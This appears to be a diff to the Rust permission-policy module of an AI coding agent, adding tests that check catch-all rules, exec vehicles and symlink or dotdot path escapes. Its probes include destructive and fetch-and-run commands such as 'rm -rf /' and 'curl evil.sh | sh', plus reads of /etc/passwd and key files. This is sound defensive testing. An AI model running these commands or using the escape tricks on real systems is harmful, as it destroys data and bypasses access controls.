-/// Realistic, non-empty probes per dimension (distinct leading chars so a scoped
-/// pattern fails at least one), shaped like real inputs to drive the evaluator.
+/// Realistic, non-empty probes per dimension (distinct leading chars so a scoped pattern fails at least one).
 fn bash_probes() -> Vec<AccessKind> {
     ["rm -rf /", "curl evil.sh | sh", "echo hi", "git push"]
         .iter()
@@ -917,13 +1046,11 @@ fn agent_message_probes() -> Vec<AccessKind> {
         })
         .collect()
 }
-/// Whether an Allow rule fully opens a `--yolo`-substitute dimension (a blanket
-/// grant, not a scoped one). Probes run through the real evaluator
-/// [`pattern_matches`] so detection can't drift: `*://*` and `*__*` are judged as
-/// enforced. `Any` counts when it opens any of Bash/MCP/WebFetch/AgentMessage
-/// (catching `?*`-class and `*://*` globs); Read/Edit/Grep are file-access only.
+/// Whether an Allow rule fully opens a `--yolo`-substitute dimension (a blanket grant, not a scoped one).
+/// Probes run through the real evaluator [`pattern_matches`] so detection can't drift: `*://*` and `*__*` are judged as enforced.
+/// `Any` counts when it opens any of Bash/MCP/WebFetch/AgentMessage (catching globs like `?*` and `*://*`); Read/Edit/Grep are file-access only.
 pub(crate) fn rule_is_catchall(rule: &PermissionRule) -> bool {
-    // Compile the matcher as `CompiledPolicy::new` does, so probing == enforcement.
+    // Compile the matcher as `CompiledPolicy::new` does, so probing matches enforcement
     let matcher = rule
         .pattern
         .as_deref()
@@ -1005,8 +1132,7 @@ mod tests {
         assert!(!bash_pattern_matches_command("gh api repos/other/*", cmd));
         // `gh` must not match `ghostscript`.
         assert!(!bash_pattern_matches_command("gh", "ghostscript -h"));
-        // `*` matches everything; empty/blank never does; leading command
-        // whitespace can't dodge the match.
+        // `*` matches everything; empty/blank never does; leading command whitespace can't dodge the match
         assert!(bash_pattern_matches_command("*", cmd));
         assert!(!bash_pattern_matches_command("", cmd));
         assert!(!bash_pattern_matches_command("   ", cmd));
@@ -1033,8 +1159,7 @@ mod tests {
         };
         let glob = |tool: ToolFilter, p: Option<&str>| rule(tool, p, PatternMode::Glob);
 
-        // Bare / universal / prefix-regime globs are catch-alls in every
-        // substitute dimension, including `Any` (commands, MCP names, URLs, paths).
+        // Bare / universal / prefix-regime globs are catch-alls in every substitute dimension, including `Any` (commands, MCP names, URLs, paths)
         for tool in [
             ToolFilter::Bash,
             ToolFilter::Mcp,
@@ -1050,25 +1175,22 @@ mod tests {
                 rule_is_catchall(&glob(tool.clone(), Some("**"))),
                 "{tool:?} **"
             );
-            // `?*` matches every non-empty input — the prefix-regime gap the old
-            // empty-string probe missed, now closed for `Any` too.
+            // `?*` matches every non-empty input
             assert!(
                 rule_is_catchall(&glob(tool.clone(), Some("?*"))),
                 "{tool:?} ?*"
             );
         }
-        // `Any(**/*)` is also universal (preserves the old Any-detector case).
+        // `Any(**/*)` is also universal
         assert!(rule_is_catchall(&glob(ToolFilter::Any, Some("**/*"))));
 
-        // Shape-specific catch-alls a bash-shaped probe missed, judged via the
-        // real matcher.
+        // Shape-specific catch-alls a bash-shaped probe missed, judged via the real matcher
         assert!(rule_is_catchall(&glob(ToolFilter::WebFetch, Some("*://*"))));
         assert!(rule_is_catchall(&glob(ToolFilter::Mcp, Some("*__*"))));
         // `Any` also counts when it fully opens a single dimension (all web).
         assert!(rule_is_catchall(&glob(ToolFilter::Any, Some("*://*"))));
 
-        // Scoped grants survive in every dimension; for `Any`, a pattern scoped
-        // to one regime fails the others' probes.
+        // Scoped grants survive in every dimension; for `Any`, a pattern scoped to one regime fails the others' probes
         assert!(!rule_is_catchall(&glob(ToolFilter::Bash, Some("git *"))));
         assert!(!rule_is_catchall(&glob(ToolFilter::Bash, Some("npm*"))));
         assert!(!rule_is_catchall(&glob(ToolFilter::Mcp, Some("github__*"))));
@@ -1091,15 +1213,14 @@ mod tests {
 
     #[test]
     fn bash_glob_is_catchall_refuses_universal_patterns() {
-        // Universal patterns match every bash probe, so persisting them from a
-        // (possibly forged) client reply would mint a blanket grant.
+        // Universal patterns match every bash probe, so persisting them from a (possibly forged) client reply would mint a blanket grant
         for pattern in ["*", "**", "* *", "?*"] {
             assert!(
                 bash_glob_is_catchall(pattern),
                 "{pattern:?} matches everything and must be treated as a catch-all",
             );
         }
-        // Scoped patterns the editor produces stay honorable.
+        // Scoped patterns the editor produces are not catch-alls
         for pattern in ["gh api repos/owner/*", "git push*", "cargo *", "deploy *"] {
             assert!(
                 !bash_glob_is_catchall(pattern),
@@ -1111,9 +1232,8 @@ mod tests {
     #[test]
     fn head_is_exec_vehicle_normalizes_spellings() {
         let words = |s: &str| -> Vec<String> { s.split_whitespace().map(str::to_owned).collect() };
-        // Interpreters, versioned/free-threaded spellings, distro variants,
-        // package runners, escalators, and remote shells — path- and
-        // case-insensitive, `.exe` stripped.
+        // Interpreters, versioned/free-threaded spellings, distro variants, package runners, escalators, and remote shells
+        // Matching is path- and case-insensitive, with `.exe` stripped
         for cmd in [
             "python foo.py",
             "python3.13 foo.py",
@@ -1135,8 +1255,7 @@ mod tests {
                 "{cmd:?} head must be an exec vehicle",
             );
         }
-        // Family lookalikes without a version-like suffix, and plain tools, are
-        // not vehicles — they keep the narrow-rule classifier bypass.
+        // Family lookalikes without a version-like suffix, and plain tools, are not vehicles; they keep the narrow-rule classifier bypass
         for cmd in [
             "nodemon server.js",
             "phpunit --filter Foo",
@@ -1220,7 +1339,7 @@ mod tests {
 
     #[test]
     fn test_none_and_wildcard_patterns() {
-        // None pattern = match all (used by bare tool rules like "Bash" with no specifier)
+        // A None pattern matches everything (used by bare tool rules like "Bash" with no specifier)
         let none_rule = PermissionRule {
             action: RuleAction::Allow,
             tool: ToolFilter::Any,
@@ -1230,7 +1349,6 @@ mod tests {
         assert!(matches(&AccessKind::Bash("anything".into()), &none_rule));
         assert!(matches(&AccessKind::Read(None), &none_rule));
 
-        // Read(None) should not match a specific pattern
         assert!(!matches(&AccessKind::Read(None), &rule_for("src/*")));
     }
 
@@ -1700,8 +1818,8 @@ mod tests {
         );
     }
 
-    /// Managed Bash deny fidelity for `env -S`/`--split-string`: high-confidence
-    /// packed payloads hard-Reject; every split-string shape keeps an Ask floor.
+    /// Managed Bash deny fidelity for `env -S`/`--split-string`.
+    /// High-confidence packed payloads hard-Reject; every split-string shape keeps an Ask floor.
     #[test]
     fn env_split_string_bash_deny_fidelity() {
         use crate::permission::bash_command_splitting::{MAX_NORMALIZE_ROUNDS, MAX_WRAPPER_DEPTH};
@@ -1766,7 +1884,7 @@ mod tests {
             Some(Decision::Ask)
         ));
 
-        // Clusters / metasyntax / unknown options / missing operand → Ask floor.
+        // Clusters / metasyntax / unknown options / missing operand keep the Ask floor
         for cmd in [
             "env -iS 'rm -rf /tmp/victim'",
             "env -vS 'rm -rf /tmp/victim'",
@@ -1876,9 +1994,8 @@ mod tests {
         assert!(matches!(result, Some(Decision::Reject(_))));
     }
 
-    /// Rules naming an exec vehicle (interpreter / runner / privilege
-    /// escalator) look narrow to the catch-all probes but grant arbitrary
-    /// code execution, so they must not resolve before the auto classifier.
+    /// An exec-vehicle rule (interpreter / runner / privilege escalator) looks narrow to the catch-all probes but grants arbitrary code execution.
+    /// So it must not resolve before the auto classifier.
     #[test]
     fn exec_vehicle_rules_are_not_narrow() {
         let rule = |pattern: &str| PermissionRule {
@@ -1912,8 +2029,7 @@ mod tests {
                 "{pattern}: exec vehicle must not count as narrow"
             );
         }
-        // Family lookalikes are NOT vehicles: only version-like suffixes
-        // (`python3.13`) count, so `nodemon`/`phpunit` rules keep the bypass.
+        // Family lookalikes are NOT vehicles: only version-like suffixes (`python3.13`) count, so `nodemon`/`phpunit` rules keep the bypass
         for (pattern, cmd) in [
             ("nodemon", "nodemon server.js"),
             ("phpunit", "phpunit --filter Foo"),
@@ -1924,8 +2040,7 @@ mod tests {
                 "{pattern}: family-prefix lookalike must stay narrow"
             );
         }
-        // A scoped non-vehicle rule stays narrow; a catch-all never is, and a
-        // command only the catch-all covers is not narrow in a mixed config.
+        // A scoped non-vehicle rule stays narrow; a catch-all never is, and a command only the catch-all covers is not narrow in a mixed config
         let push = AccessKind::Bash("git push origin main".into());
         let narrow = rule("git push");
         let catchall = PermissionRule {
@@ -1941,8 +2056,7 @@ mod tests {
         let mixed = CompiledPolicy::new(PermissionConfig::new(vec![catchall, narrow]));
         assert!(mixed.narrow_allow_authorizes(&push));
         assert!(!mixed.narrow_allow_authorizes(&AccessKind::Bash("terraform destroy".into())));
-        // Non-Bash access is never narrow (its allows bypass the classifier
-        // without consulting narrowness).
+        // Non-Bash access is never narrow (its allows bypass the classifier without consulting narrowness)
         assert!(!mixed.narrow_allow_authorizes(&AccessKind::WebFetch("https://x.test".into())));
     }
 
@@ -1970,9 +2084,8 @@ mod tests {
         assert!(policy.evaluate(&other_server).is_none());
     }
 
-    /// The allow direction of the same `mcp__…` rewrite: a Claude-spelling
-    /// allow rule must auto-allow the server's tools end-to-end through
-    /// `CompiledPolicy`, and stay scoped to that server.
+    /// The allow direction of the same `mcp__…` rewrite.
+    /// A Claude-spelling allow rule must auto-allow the server's tools end-to-end through `CompiledPolicy`, and stay scoped to that server.
     #[test]
     fn claude_mcp_allow_rule_auto_allows_server_tools() {
         use crate::permission::rules::parse_permission_rule;
@@ -2039,10 +2152,9 @@ mod tests {
         assert!(evaluate_policy(&AccessKind::WebSearch("rust".into()), &policy).is_none());
     }
 
-    /// The Grep tool reads file contents, so managed `Read` rules must govern it:
-    /// grepping a denied path is denied, an ask path prompts, and an unrestricted
-    /// path is unaffected. A recursive grep (no concrete path) matches no path
-    /// rule — tool-level glob excludes (not the policy) keep traversal safe.
+    /// The Grep tool reads file contents, so managed `Read` rules must govern it.
+    /// Grepping a denied path is denied, an ask path prompts, and an unrestricted path is unaffected.
+    /// A recursive grep (no concrete path) matches no path rule; tool-level glob excludes (not the policy) keep traversal safe.
     #[test]
     fn grep_tool_covered_by_read_rules() {
         let read_rule = |action: RuleAction, pattern: &str| PermissionRule {
@@ -2156,8 +2268,7 @@ mod tests {
             eval_read_at("./src/lib.rs", &rule, cwd),
             Some(Decision::Allow)
         ));
-        // `**` would otherwise consume `..`; normalization erases it first, so
-        // the escaped path no longer carries the `src/` prefix the glob needs.
+        // `**` would otherwise consume `..`; normalization erases it first, so the escaped path no longer carries the `src/` prefix the glob needs
         assert!(eval_read_at("src/../../etc/passwd", &rule, cwd).is_none());
         assert!(eval_read_at("src/../secrets/token", &rule, cwd).is_none());
         assert!(eval_read_at("other/main.rs", &rule, cwd).is_none());
@@ -2255,8 +2366,7 @@ mod tests {
         let cwd = Path::new("/workspace/project");
         let rule = read_allow("src/ma*");
 
-        // A wildcard mid-segment must not break matching of the normalized
-        // relative spellings.
+        // A wildcard mid-segment must not break matching of the normalized relative spellings
         for path in ["src/main.rs", "./src/matrix.rs"] {
             assert!(
                 matches!(eval_read_at(path, &rule, cwd), Some(Decision::Allow)),
@@ -2303,9 +2413,8 @@ mod tests {
     #[test]
     fn tilde_paths_never_match_workspace_allows() {
         let cwd = Path::new("/workspace/project");
-        // Tools expand a leading `~` to the real home AFTER this gate runs, so
-        // a tilde path must never gain cwd-relative spellings (`./~/…` would
-        // satisfy `./**` while the read escapes the workspace).
+        // Tools expand a leading `~` to the real home AFTER this gate runs, so a tilde path must never gain cwd-relative spellings
+        // A `./~/…` spelling would satisfy `./**` while the read escapes the workspace
         let rule = read_allow("./**");
         for path in ["~/secrets/key.pem", "~", "~other/refs"] {
             assert!(
@@ -2319,12 +2428,11 @@ mod tests {
             None
         ));
 
-        // Collapse must not erase the tilde: `~/../key.pem` is not the
-        // workspace file `key.pem`.
+        // Collapse must not erase the tilde: `~/../key.pem` is not the workspace file `key.pem`
         let pem = read_allow("*.pem");
         assert!(eval_read_at("~/../key.pem", &pem, cwd).is_none());
 
-        // Literal `~` patterns still key on tilde spellings.
+        // Literal `~` patterns still match tilde spellings
         let deny = read_deny("~/**");
         assert!(matches!(
             eval_read_at("~/secrets/key.pem", &deny, cwd),
@@ -2343,5 +2451,281 @@ mod tests {
         ));
         assert!(eval_read_at("docs/sub/deep.md", &rule, cwd).is_none());
         assert!(eval_read_at("docs/../escape.md", &rule, cwd).is_none());
+    }
+
+    #[cfg(unix)]
+    fn file_rule(action: RuleAction, tool: ToolFilter, pattern: &str) -> PermissionRule {
+        PermissionRule {
+            action,
+            tool,
+            pattern: Some(pattern.to_owned()),
+            pattern_mode: PatternMode::Glob,
+        }
+    }
+
+    #[cfg(unix)]
+    fn symlink_leaf_access(tool: ToolFilter, arg: &str) -> AccessKind {
+        match tool {
+            ToolFilter::Edit => AccessKind::Edit(arg.into()),
+            ToolFilter::Read => AccessKind::Read(Some(arg.into())),
+            ToolFilter::Grep => AccessKind::Grep {
+                path: Some(arg.into()),
+                glob: None,
+            },
+            _ => panic!("unexpected tool"),
+        }
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn deny_matches_workspace_symlink_target_for_edit_read_grep() {
+        use std::os::unix::fs::symlink;
+
+        let ws = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        let secret = outside.path().join("deny-secret.txt");
+        std::fs::write(&secret, b"secret").unwrap();
+        std::fs::create_dir(ws.path().join("config")).unwrap();
+        symlink(&secret, ws.path().join("config/notes.txt")).unwrap();
+
+        for tool in [ToolFilter::Edit, ToolFilter::Read, ToolFilter::Grep] {
+            let policy = CompiledPolicy::new(PermissionConfig::new(vec![file_rule(
+                RuleAction::Deny,
+                tool.clone(),
+                "**/deny-secret.txt",
+            )]));
+            let decision = policy.evaluate_with_cwd(
+                &symlink_leaf_access(tool.clone(), "config/notes.txt"),
+                Some(ws.path()),
+            );
+            assert!(
+                matches!(decision, Some(Decision::Reject(_))),
+                "expected Reject for {tool:?} via symlink, got {decision:?}"
+            );
+        }
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn midpath_symlink_deny_on_real_path_rejects() {
+        use std::os::unix::fs::symlink;
+
+        let ws = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        let real_dir = outside.path().join("prohibited-zone");
+        std::fs::create_dir(&real_dir).unwrap();
+        std::fs::write(real_dir.join("data.txt"), b"secret").unwrap();
+        symlink(&real_dir, ws.path().join("linked")).unwrap();
+
+        let policy = CompiledPolicy::new(PermissionConfig::new(vec![file_rule(
+            RuleAction::Deny,
+            ToolFilter::Edit,
+            "**/prohibited-zone/**",
+        )]));
+        let decision =
+            policy.evaluate_with_cwd(&AccessKind::Edit("linked/data.txt".into()), Some(ws.path()));
+        assert!(
+            matches!(decision, Some(Decision::Reject(_))),
+            "expected Reject for mid-path symlink, got {decision:?}"
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn physical_dotdot_after_symlink_hits_deny() {
+        use std::os::unix::fs::symlink;
+
+        let ws = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        let zone = outside.path().join("prohibited-zone");
+        std::fs::create_dir_all(zone.join("dir")).unwrap();
+        std::fs::create_dir_all(zone.join("dir2")).unwrap();
+        std::fs::write(zone.join("dir2/x"), b"secret").unwrap();
+        symlink(zone.join("dir"), ws.path().join("link")).unwrap();
+
+        let policy = CompiledPolicy::new(PermissionConfig::new(vec![file_rule(
+            RuleAction::Deny,
+            ToolFilter::Read,
+            "**/prohibited-zone/**",
+        )]));
+        let decision = policy.evaluate_with_cwd(
+            &AccessKind::Read(Some("link/../dir2/x".into())),
+            Some(ws.path()),
+        );
+        assert!(
+            matches!(decision, Some(Decision::Reject(_))),
+            "expected Reject for physical .. after symlink, got {decision:?}"
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn dangling_leaf_symlink_deny_on_target_rejects() {
+        use std::os::unix::fs::symlink;
+
+        let ws = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        let secret_dir = outside.path().join("prohibited-zone");
+        std::fs::create_dir(&secret_dir).unwrap();
+        symlink(secret_dir.join("new.txt"), ws.path().join("out")).unwrap();
+
+        let policy = CompiledPolicy::new(PermissionConfig::new(vec![file_rule(
+            RuleAction::Deny,
+            ToolFilter::Edit,
+            "**/prohibited-zone/**",
+        )]));
+        let decision = policy.evaluate_with_cwd(&AccessKind::Edit("out".into()), Some(ws.path()));
+        assert!(
+            matches!(decision, Some(Decision::Reject(_))),
+            "expected Reject for dangling symlink create, got {decision:?}"
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn allow_on_target_not_granted_via_symlink_arg() {
+        use std::os::unix::fs::symlink;
+
+        let ws = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        let secret = outside.path().join("allowed-outside.txt");
+        std::fs::write(&secret, b"x").unwrap();
+        std::fs::create_dir(ws.path().join("config")).unwrap();
+        symlink(&secret, ws.path().join("config/notes.txt")).unwrap();
+
+        let policy = CompiledPolicy::new(PermissionConfig::new(vec![file_rule(
+            RuleAction::Allow,
+            ToolFilter::Edit,
+            "**/allowed-outside.txt",
+        )]));
+        let decision = policy.evaluate_with_cwd(
+            &AccessKind::Edit("config/notes.txt".into()),
+            Some(ws.path()),
+        );
+        assert!(
+            decision.is_none(),
+            "expected no Allow via symlink arg, got {decision:?}"
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn ask_matches_resolved_symlink_target() {
+        use std::os::unix::fs::symlink;
+
+        let ws = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        let secret = outside.path().join("ask-target.txt");
+        std::fs::write(&secret, b"x").unwrap();
+        std::fs::create_dir(ws.path().join("config")).unwrap();
+        symlink(&secret, ws.path().join("config/notes.txt")).unwrap();
+
+        let policy = CompiledPolicy::new(PermissionConfig::new(vec![file_rule(
+            RuleAction::Ask,
+            ToolFilter::Edit,
+            "**/ask-target.txt",
+        )]));
+        let decision = policy.evaluate_with_cwd(
+            &AccessKind::Edit("config/notes.txt".into()),
+            Some(ws.path()),
+        );
+        assert!(
+            matches!(decision, Some(Decision::Ask)),
+            "expected Ask via symlink target, got {decision:?}"
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn deny_on_target_beats_allow_on_link() {
+        use std::os::unix::fs::symlink;
+
+        let ws = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        let secret = outside.path().join("deny-secret.txt");
+        std::fs::write(&secret, b"secret").unwrap();
+        std::fs::create_dir(ws.path().join("config")).unwrap();
+        symlink(&secret, ws.path().join("config/notes.txt")).unwrap();
+
+        let policy = CompiledPolicy::new(PermissionConfig::new(vec![
+            file_rule(RuleAction::Allow, ToolFilter::Edit, "config/notes.txt"),
+            file_rule(RuleAction::Deny, ToolFilter::Edit, "**/deny-secret.txt"),
+        ]));
+        let decision = policy.evaluate_with_cwd(
+            &AccessKind::Edit("config/notes.txt".into()),
+            Some(ws.path()),
+        );
+        assert!(
+            matches!(decision, Some(Decision::Reject(_))),
+            "expected Reject over lexical Allow, got {decision:?}"
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn unresolvable_symlink_with_restrictions_asks() {
+        use std::os::unix::fs::symlink;
+
+        let ws = tempfile::tempdir().unwrap();
+        symlink(ws.path().join("b"), ws.path().join("a")).unwrap();
+        symlink(ws.path().join("a"), ws.path().join("b")).unwrap();
+
+        for (tool, access) in [
+            (ToolFilter::Read, AccessKind::Read(Some("a".into()))),
+            (
+                ToolFilter::Grep,
+                AccessKind::Grep {
+                    path: Some("a".into()),
+                    glob: None,
+                },
+            ),
+        ] {
+            let restricted = CompiledPolicy::new(PermissionConfig::new(vec![file_rule(
+                RuleAction::Deny,
+                tool.clone(),
+                "**/unrelated/**",
+            )]));
+            let (decision, fail_closed) =
+                restricted.evaluate_with_cwd_details(&access, Some(ws.path()));
+            assert!(
+                matches!(decision, Some(Decision::Ask)),
+                "expected Ask for {tool:?} cycle, got {decision:?}"
+            );
+            assert!(fail_closed, "expected fail-closed for {tool:?} cycle");
+        }
+
+        let open = CompiledPolicy::new(PermissionConfig::new(vec![]));
+        let (open_decision, open_fail) =
+            open.evaluate_with_cwd_details(&AccessKind::Read(Some("a".into())), Some(ws.path()));
+        assert!(
+            open_decision.is_none(),
+            "expected no Ask without restrictions, got {open_decision:?}"
+        );
+        assert!(!open_fail);
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn unresolvable_midpath_symlink_asks() {
+        use std::os::unix::fs::symlink;
+
+        let ws = tempfile::tempdir().unwrap();
+        symlink(ws.path().join("linkdir2"), ws.path().join("linkdir")).unwrap();
+        symlink(ws.path().join("linkdir"), ws.path().join("linkdir2")).unwrap();
+
+        let policy = CompiledPolicy::new(PermissionConfig::new(vec![file_rule(
+            RuleAction::Deny,
+            ToolFilter::Edit,
+            "**/unrelated/**",
+        )]));
+        let (decision, fail_closed) = policy.evaluate_with_cwd_details(
+            &AccessKind::Edit("linkdir/file.txt".into()),
+            Some(ws.path()),
+        );
+        assert!(
+            matches!(decision, Some(Decision::Ask)),
+            "expected Ask for mid-path cycle, got {decision:?}"
+        );
+        assert!(fail_closed);
     }
 }
